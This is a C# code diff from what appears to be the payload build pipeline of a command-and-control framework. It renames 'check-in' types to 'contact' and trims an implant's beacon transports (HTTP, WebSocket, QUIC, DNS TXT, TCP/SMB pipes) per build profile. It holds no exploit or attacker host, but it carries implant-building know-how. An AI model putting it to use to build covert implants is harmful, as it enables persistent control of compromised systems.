@@ -1,23 +1,23 @@
 namespace Rod.BuildPipeline.PayloadBuild;
 
 /// <summary>
-/// The check-in mode wire values a build profile bakes (the same strings the
+/// The contact mode wire values a build profile bakes (the same strings the
 /// implant's Config normalizes): "stream" holds a connection open, "poll"
 /// cycles. The web URL shape splits by it -- stream dials the WebSocket
 /// beacon, poll runs the envelope POST cycle.
 /// </summary>
-public static class CheckInModes
+public static class ContactModes
 {
     public const string Stream = "stream";
     public const string Poll = "poll";
 }
 
 /// <summary>
-/// The check-in modules a build compiles in (architecture.md Sec 8): one
+/// The contact modules a build compiles in (architecture.md Sec 8): one
 /// flag per implant-side client the bake-time trim can include.
 /// </summary>
 [Flags]
-public enum CheckInModules
+public enum ContactModules
 {
     None = 0,
 
@@ -49,7 +49,7 @@ public enum CheckInModules
     Quic = 8,
 
     /// <summary>
-    /// The DNS check-in client (the implant's DnsCheckIn): serves walk
+    /// The DNS contact client (the implant's DnsContact): serves walk
     /// entries whose beacon URL is dns-schemed -- the egress-restricted
     /// TXT carrier, poll-only (the parser refuses a stream-mode naming
     /// with the fix).
@@ -57,9 +57,9 @@ public enum CheckInModules
     Dns = 16,
 
     /// <summary>
-    /// The socket check-in client (the implant's SocketBeacon): serves walk
+    /// The socket contact client (the implant's SocketBeacon): serves walk
     /// entries whose beacon URL is tcp- or smb-schemed -- the named-pipe and
-    /// raw-socket poll carriers, one connection one check-in, the interactive
+    /// raw-socket poll carriers, one connection one contact, the interactive
     /// verbs on the shared store-and-forward carriage.
     /// </summary>
     Socket = 32,
@@ -74,7 +74,7 @@ public enum CheckInModules
 }
 
 /// <summary>
-/// One check-in module's bake-time descriptor: everything the trim needs to
+/// One contact module's bake-time descriptor: everything the trim needs to
 /// know about a carrier's implant-side client -- which module flag it is,
 /// which source files carry it in the implant tree, which beacon URL shapes
 /// (and mode) it serves, and the factory line the generated transport
@@ -83,43 +83,43 @@ public enum CheckInModules
 /// carrier contributes through (its provider on the server side, its module
 /// descriptor and sources on the implant side).
 /// </summary>
-public sealed record CheckInModuleDescriptor(
-    CheckInModules Module,
+public sealed record ContactModuleDescriptor(
+    ContactModules Module,
     string[] Files,
     Func<string, string, bool> Serves,
     string FactoryLine);
 
 /// <summary>
-/// The registered check-in modules. Matching order is load-bearing: the
+/// The registered contact modules. Matching order is load-bearing: the
 /// shapes are disjoint except the stream descriptor's bare host:port
 /// fallthrough, which must sit last so a schemed or quic or dns entry never
 /// falls into it, and the socket family's two clients, whose order decides
 /// which one a both-compiled build dispatches a socket URL to.
 /// </summary>
-public static class CheckInModuleRegistry
+public static class ContactModuleRegistry
 {
-    private static readonly CheckInModuleDescriptor[] Descriptors =
+    private static readonly ContactModuleDescriptor[] Descriptors =
     {
         new(
-            CheckInModules.Web,
-            ["Internal/EnvelopeBeacon.cs", "Internal/WebCheckIn.cs"],
-            (url, mode) => IsWebBeaconUrl(url) && mode != CheckInModes.Stream,
-            "        WebCheckIn.Create(setup),"),
+            ContactModules.Web,
+            ["Internal/EnvelopeBeacon.cs", "Internal/WebContact.cs"],
+            (url, mode) => IsWebBeaconUrl(url) && mode != ContactModes.Stream,
+            "        WebContact.Create(setup),"),
         new(
-            CheckInModules.WebSocket,
+            ContactModules.WebSocket,
             ["Internal/WsBeacon.cs"],
-            (url, mode) => IsWebBeaconUrl(url) && mode == CheckInModes.Stream,
-            "        WsCheckIn.Create(setup),"),
+            (url, mode) => IsWebBeaconUrl(url) && mode == ContactModes.Stream,
+            "        WsContact.Create(setup),"),
         new(
-            CheckInModules.Quic,
-            ["Internal/QuicCheckIn.cs", "Internal/QuicEnroll.cs"],
+            ContactModules.Quic,
+            ["Internal/QuicContact.cs", "Internal/QuicEnroll.cs"],
             (url, _) => IsQuicBeaconUrl(url),
-            "        QuicCheckIn.Create(setup),"),
+            "        QuicContact.Create(setup),"),
         new(
-            CheckInModules.Dns,
-            ["Internal/DnsCheckIn.cs", "Internal/DnsEnroll.cs"],
+            ContactModules.Dns,
+            ["Internal/DnsContact.cs", "Internal/DnsEnroll.cs"],
             (url, _) => IsDnsBeaconUrl(url),
-            "        DnsCheckIn.Create(setup),"),
+            "        DnsContact.Create(setup),"),
         // The socket family's stream client sits ahead of its poll client in
         // the registry: a build both compile into (a socket-schemed enroll
         // claims the poll module for its dial whatever the mode) dispatches
@@ -127,23 +127,23 @@ public static class CheckInModuleRegistry
         // stream-mode bake and the poll client rides as the enroll dial's
         // dead weight, trimmed by the linker.
         new(
-            CheckInModules.SocketStream,
+            ContactModules.SocketStream,
             ["Internal/SocketStream.cs", "Internal/SocketWire.cs"],
-            (url, mode) => IsSocketBeaconUrl(url) && mode == CheckInModes.Stream,
-            "        SocketStreamCheckIn.Create(setup),"),
+            (url, mode) => IsSocketBeaconUrl(url) && mode == ContactModes.Stream,
+            "        SocketStreamContact.Create(setup),"),
         new(
-            CheckInModules.Socket,
-            ["Internal/SocketCheckIn.cs", "Internal/SocketEnroll.cs", "Internal/SocketWire.cs"],
-            (url, mode) => IsSocketBeaconUrl(url) && mode != CheckInModes.Stream,
-            "        SocketCheckIn.Create(setup),"),
+            ContactModules.Socket,
+            ["Internal/SocketContact.cs", "Internal/SocketEnroll.cs", "Internal/SocketWire.cs"],
+            (url, mode) => IsSocketBeaconUrl(url) && mode != ContactModes.Stream,
+            "        SocketContact.Create(setup),"),
         new(
-            CheckInModules.Stream,
-            ["Internal/Beacon.cs", "Internal/StreamCheckIn.cs"],
+            ContactModules.Stream,
+            ["Internal/Beacon.cs", "Internal/StreamContact.cs"],
             (_, _) => true,
-            "        StreamCheckIn.Create(setup),"),
+            "        StreamContact.Create(setup),"),
     };
 
-    public static IReadOnlyList<CheckInModuleDescriptor> All => Descriptors;
+    public static IReadOnlyList<ContactModuleDescriptor> All => Descriptors;
 
     // Whether an enroll entry's URL needs the QUIC module: the QUIC enroll
     // exchange (architecture.md Sec 8) rides the module's dial, so a
@@ -153,7 +153,7 @@ public static class CheckInModuleRegistry
     public static bool EnrollsOverQuic(string enrollUrl) => IsQuicBeaconUrl(enrollUrl);
 
     // The socket enroll exchange rides the socket module's dial the same
-    // way (Sec 8, enrollment over the stream check-in): a tcp- or
+    // way (Sec 8, enrollment over the stream contact): a tcp- or
     // smb-schemed enroll endpoint claims the module whatever the session's
     // front names.
     public static bool EnrollsOverSocket(string enrollUrl) => IsSocketBeaconUrl(enrollUrl);
@@ -202,7 +202,7 @@ public static class CheckInModuleRegistry
 
 /// <summary>
 /// The bake-time transport trim (architecture.md Sec 6, Sec 8): selects
-/// which check-in modules an implant-class build compiles and rewrites the
+/// which contact modules an implant-class build compiles and rewrites the
 /// staging copy accordingly. The selection walks the registry's descriptors
 /// per egress entry -- the first descriptor whose shape (and mode) serves
 /// the URL claims it -- applied to the primary and each fallback, so the
@@ -219,12 +219,12 @@ public static class CheckInModuleRegistry
 /// compiles), which also drops the Grpc.Net.Client reference: a web-shaped
 /// artifact links no gRPC client code at all, and a stream-shaped one keeps
 /// the full client. The stager tree is never trimmed: it fetches over plain
-/// HTTP and carries no check-in clients.
+/// HTTP and carries no contact clients.
 /// </remarks>
 public static class TransportModuleSelection
 {
     /// <summary>
-    /// Selects the check-in modules a profile's baked egress walk needs: the
+    /// Selects the contact modules a profile's baked egress walk needs: the
     /// primary entry's beacon URL (the named beacon endpoint, else the one
     /// derived from the enroll endpoint -- the same value
     /// <c>RenderBakedProfile</c> bakes as <c>beaconURL</c>) plus each
@@ -240,9 +240,9 @@ public static class TransportModuleSelection
     /// enroll entry needs the module even when a named beacon split points
     /// the session at another front.
     /// </remarks>
-    public static CheckInModules Select(TransportProfile profile, string mode)
+    public static ContactModules Select(TransportProfile profile, string mode)
     {
-        var modules = CheckInModules.None;
+        var modules = ContactModules.None;
         Consider(profile.BeaconEndpoint ?? DotNetBuildUnit.BeaconUrlFromEnroll(profile.Endpoint));
         foreach (var fallback in profile.FallbackEndpoints)
             Consider(DotNetBuildUnit.BeaconUrlFromEnroll(fallback));
@@ -253,7 +253,7 @@ public static class TransportModuleSelection
 
         void Consider(string beaconUrl)
         {
-            foreach (var descriptor in CheckInModuleRegistry.All)
+            foreach (var descriptor in ContactModuleRegistry.All)
             {
                 if (!descriptor.Serves(beaconUrl, mode))
                     continue;
@@ -267,12 +267,12 @@ public static class TransportModuleSelection
         // client always compiles, so it claims nothing.
         void ClaimEnroll(string enrollUrl)
         {
-            if (CheckInModuleRegistry.EnrollsOverQuic(enrollUrl))
-                modules |= CheckInModules.Quic;
-            if (CheckInModuleRegistry.EnrollsOverSocket(enrollUrl))
-                modules |= CheckInModules.Socket;
-            if (CheckInModuleRegistry.EnrollsOverDns(enrollUrl))
-                modules |= CheckInModules.Dns;
+            if (ContactModuleRegistry.EnrollsOverQuic(enrollUrl))
+                modules |= ContactModules.Quic;
+            if (ContactModuleRegistry.EnrollsOverSocket(enrollUrl))
+                modules |= ContactModules.Socket;
+            if (ContactModuleRegistry.EnrollsOverDns(enrollUrl))
+                modules |= ContactModules.Dns;
         }
     }
 
@@ -281,34 +281,34 @@ public static class TransportModuleSelection
     /// the Grpc.Net.Client reference): only a walk with a stream-shaped
     /// entry dials one.
     /// </summary>
-    public static bool NeedsGrpcClient(CheckInModules modules)
-        => (modules & CheckInModules.Stream) != 0;
+    public static bool NeedsGrpcClient(ContactModules modules)
+        => (modules & ContactModules.Stream) != 0;
 
     /// <summary>
     /// Rewrites the staging copy of the implant tree to carry exactly the
     /// selected modules: each unselected descriptor's source files are
     /// deleted whole, and the generated TransportSelection replaces the
     /// checked-in stub naming only the compiled factories. A set of
-    /// <see cref="CheckInModules.None"/> is refused -- a primary entry always
+    /// <see cref="ContactModules.None"/> is refused -- a primary entry always
     /// exists, so an empty set means the caller, not the profile, is wrong.
     /// </summary>
-    public static void Apply(string stagingDir, CheckInModules modules)
+    public static void Apply(string stagingDir, ContactModules modules)
     {
-        if (modules == CheckInModules.None)
+        if (modules == ContactModules.None)
             throw new InvalidOperationException(
-                "A build must compile at least one check-in module; the egress walk's primary entry always has a shape.");
+                "A build must compile at least one contact module; the egress walk's primary entry always has a shape.");
 
         // The files the selected modules keep: a file shared by two modules
         // (the socket family's wire, compiled into both its clients) stays
         // when either module compiled, so an unselected sibling's delete
         // pass cannot drop it out from under the survivor.
         var keep = new HashSet<string>(
-            CheckInModuleRegistry.All
+            ContactModuleRegistry.All
                 .Where(descriptor => (modules & descriptor.Module) != 0)
                 .SelectMany(descriptor => descriptor.Files),
             StringComparer.Ordinal);
 
-        foreach (var descriptor in CheckInModuleRegistry.All)
+        foreach (var descriptor in ContactModuleRegistry.All)
         {
             if ((modules & descriptor.Module) != 0)
                 continue;
@@ -329,43 +329,43 @@ public static class TransportModuleSelection
 
     // Renders the per-build TransportSelection: same shape as the checked-in
     // stub, naming only the compiled factories in registry order. The
-    // implant's Program hands this array to its check-in coordinator, which
+    // implant's Program hands this array to its contact coordinator, which
     // picks per URL shape and mode at run time -- with one module compiled
     // the pick is constant, with several (a shape-crossing walk) it follows
     // the walk exactly as the dev tree does. The enroll dispatch names a
     // module's branch only when the module compiled -- the http branch (C2)
     // is always compiled, so the member always exists for the Program to
     // call.
-    private static string RenderSelection(CheckInModules modules)
+    private static string RenderSelection(ContactModules modules)
     {
         var factories = new List<string>();
-        foreach (var descriptor in CheckInModuleRegistry.All)
+        foreach (var descriptor in ContactModuleRegistry.All)
             if ((modules & descriptor.Module) != 0)
                 factories.Add(descriptor.FactoryLine);
         var enrollChain = "await C2.EnrollAsync(dial, cancellationToken)";
-        if ((modules & CheckInModules.Dns) != 0)
+        if ((modules & ContactModules.Dns) != 0)
             enrollChain =
                 "BeaconUrl.IsDns(dial.EnrollUrl)\n"
                 + "                    ? await DnsEnroll.EnrollAsync(dial, cancellationToken)\n"
                 + "                    : " + enrollChain;
-        if ((modules & CheckInModules.Socket) != 0)
+        if ((modules & ContactModules.Socket) != 0)
             enrollChain =
                 "BeaconUrl.IsSocket(dial.EnrollUrl)\n"
                 + "                ? await SocketEnroll.EnrollAsync(dial, cancellationToken)\n"
                 + "                : " + enrollChain;
-        if ((modules & CheckInModules.Quic) != 0)
+        if ((modules & ContactModules.Quic) != 0)
             enrollChain =
                 "BeaconUrl.IsQuic(dial.EnrollUrl)\n"
                 + "            ? await QuicEnroll.EnrollAsync(dial, cancellationToken)\n"
                 + "            : " + enrollChain;
         return
             "// <auto-generated> Generated by Rod.DotNetBuildUnit at build time.\n"
-            + "// The check-in modules this artifact compiles (architecture.md Sec 8),\n"
+            + "// The contact modules this artifact compiles (architecture.md Sec 8),\n"
             + "// selected from the baked egress walk's URL shapes.\n"
             + "namespace Rod.Implant.Internal;\n\n"
             + "internal static class TransportSelection\n"
             + "{\n"
-            + "    public static ICheckInClient[] CreateClients(CheckInSetup setup) =>\n"
+            + "    public static IContactClient[] CreateClients(ContactSetup setup) =>\n"
             + "    [\n"
             + string.Join("\n", factories) + "\n"
             + "    ];\n\n"
